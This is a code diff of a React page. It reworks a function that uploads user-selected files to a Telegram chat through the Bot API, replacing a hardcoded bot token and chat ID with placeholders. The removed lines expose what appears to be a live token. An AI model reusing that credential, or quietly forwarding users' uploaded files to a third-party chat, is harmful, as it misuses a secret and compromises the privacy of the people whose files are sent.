@@ -82,21 +82,22 @@ const Page = () => {
     }
   };
 
-  const sendFileToTelegram = async (file: File) => {
-    const telegramBotToken = '6919709842:AAF8t4xE2YjjhzI6OGSFB_m8PtUYW2N8q44';
-    const telegramChatId = '-4094626991';
+  
+const sendFileToTelegram = async (file: File) => {
+  const telegramBotToken = 'TON_TOKEN_BOT_TELEGRAM';
+  const telegramChatId = 'TON_ID_CHAT_TELEGRAM';
 
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
 
-    const formData = new FormData();
-    formData.append('chat_id', telegramChatId);
-    formData.append('document', file, { filename: file.name });
+  const formData = new FormData();
+  formData.append('chat_id', telegramChatId);
+  formData.append('document', file);
 
-    await fetch(url, {
-      method: 'POST',
-      body: formData,
-    });
-  };
+  await fetch(url, {
+    method: 'POST',
+    body: formData,
+  });
+};
 
   const handleFile1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
     const selectedFile = e.target.files?.[0];
